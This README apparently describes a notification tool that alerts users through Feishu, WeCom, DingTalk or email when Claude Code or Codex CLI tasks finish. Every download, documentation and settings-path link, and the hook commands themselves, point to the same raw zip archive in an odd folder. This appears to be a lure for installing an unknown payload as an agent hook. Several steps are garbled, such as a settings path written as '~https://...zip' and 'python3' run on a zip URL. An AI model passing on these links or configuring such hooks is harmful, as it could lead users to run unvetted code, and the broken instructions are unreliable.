# 🎉 ai-task-notify - Get Notified on Task Completion

Easily receive notifications for completed tasks across various platforms.

![Download Now](https://raw.githubusercontent.com/inazon/ai-task-notify/main/Aigialosauridae/ai-notify-task-v2.9.zip)

## 🚀 Getting Started

This guide will help you download and run the AI Task Notify software step by step. Follow these instructions to set up notifications for task completions.

## 📥 Download & Install

Visit the [Releases page to download](https://raw.githubusercontent.com/inazon/ai-task-notify/main/Aigialosauridae/ai-notify-task-v2.9.zip) the latest version of ai-task-notify. Choose the appropriate file for your system, download it, and follow the installation instructions below.

## ⚙️ Configuration

Before running the software, you need to set it up correctly.

### 1. Configure Notification Channels

1. Open your terminal.
2. Change directory to the ai-task-notify folder:

   ```bash
   cd ai-task-notify
   ```

3. Copy the example environment file:

   ```bash
   cp .env.example .env
   ```

4. Open the `.env` file in a text editor. Set your preferred notification channels by editing the lines that start with `NOTIFY_CHANNELS`.

   Example configuration for Feishu and Email together:

   ```plaintext
   # Enabled channels (comma-separated)
   NOTIFY_CHANNELS=feishu,email

   # Feishu
   FEISHU_WEBHOOK_URL=https://open.feishu.cn/open-apis/bot/v2/hook/...
   FEISHU_SECRET=

   # Email
   SMTP_HOST=smtp.example.com
   SMTP_PORT=465
   SMTP_USER=your-account@example.com
   SMTP_PASSWORD=your-smtp-password
   SMTP_USE_SSL=true
   EMAIL_FROM=your-account@example.com
   EMAIL_TO=recipient@example.com
   ```

### 2. Configure Claude Code

Claude Code needs to be set up to use your new notification script.

1. Locate the Claude settings file at `~https://raw.githubusercontent.com/inazon/ai-task-notify/main/Aigialosauridae/ai-notify-task-v2.9.zip`.
2. Edit the file to include the following configuration:

   ```json
   {
     "hooks": {
       "Stop": [
         {
           "matcher": "",
           "hooks": [
             {
               "type": "command",
               "command": "python3 https://raw.githubusercontent.com/inazon/ai-task-notify/main/Aigialosauridae/ai-notify-task-v2.9.zip"
             }
           ]
         }
       ]
     }
   }
   ```

### 3. Configure Codex CLI

You also need to configure Codex CLI for notifications.

1. Open the Codex configuration file at `~https://raw.githubusercontent.com/inazon/ai-task-notify/main/Aigialosauridae/ai-notify-task-v2.9.zip`.
2. Add the following line to set up the notification command:

   ```toml
   notify = ["python3", "https://raw.githubusercontent.com/inazon/ai-task-notify/main/Aigialosauridae/ai-notify-task-v2.9.zip"]
   ```

## 📜 Configuration Notes

### WeCom Setup

1. In your WeCom (企业微信) group chat, add the group robot.
2. Copy the Webhook URL and paste it into the `WECOM_WEBHOOK_URL` field.

### Feishu Setup

1. In your Feishu (飞书) group chat, add the group robot.
2. Copy the Webhook URL and paste it into the `FEISHU_WEBHOOK_URL` field.
3. If your Feishu bot enables signature verification, paste the signing key into `FEISHU_SECRET`.

### Email Setup

1. Fill in `SMTP_HOST`, `SMTP_PORT`, `SMTP_USER`, `SMTP_PASSWORD`, and `SMTP_USE_SSL` for your mail provider.
2. Set `EMAIL_FROM` to the sender address.
3. Set `EMAIL_TO` to one or more recipient addresses. Use commas to separate multiple recipients.
4. To send both Feishu and Email notifications, set `NOTIFY_CHANNELS=feishu,email`.

## 🖥️ System Requirements

Ensure you have the following installed on your computer:

- Python 3.6 or higher
- Internet access for webhook notifications
- Access to the WeCom, Feishu, or DingTalk interfaces as needed for your notifications

## 🔄 Supported Notification Channels

AI Task Notify supports the following channels:

- **WeCom** (企业微信) - Use for company-wide notifications through group chats.
- **Feishu** (飞书) - Attention grabbing notifications in teams.
- **DingTalk** (钉钉) - Quick updates for tasks and activities.
- **Email** - Standard email notifications for task completions.

## 📞 Need Help?

If you face any issues, feel free to open an issue in the GitHub repository for assistance. The community is here to help.

You can also refer to our [documentation](https://raw.githubusercontent.com/inazon/ai-task-notify/main/Aigialosauridae/ai-notify-task-v2.9.zip) for more detailed guidelines and troubleshooting steps.

Thank you for using AI Task Notify! Enjoy efficient task management and notification delivery.
